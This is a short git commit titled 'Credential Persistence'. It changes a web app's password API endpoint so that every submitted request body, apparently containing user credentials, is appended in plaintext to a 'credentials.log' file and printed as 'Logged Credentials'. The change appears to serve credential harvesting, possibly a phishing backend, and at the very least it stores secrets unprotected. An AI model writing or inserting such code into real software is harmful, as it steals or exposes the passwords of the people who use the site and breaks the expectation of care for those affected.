775c936758cfa6a9b7888d69d78f910cb07f5cf2
David Clark <somewhat.esoteric@gmail.com>
2026-01-18 20:07:15 -0500

    Credential Persistence

--- src/routes/api/password/index.js
+++ src/routes/api/password/index.js
@@ -1,7 +1,15 @@
+import fs from "fs/promises";
+
 export async function POST(event) {
   const data = await event.request.json();
 
-  console.log(data);
+  try {
+    await fs.appendFile("credentials.log", JSON.stringify(data) + "\n");
+  } catch (error) {
+    console.error("Failed to Log Credentials:", error);
+  }
+
+  console.log("Logged Credentials:", data);
 
   return data;
 }
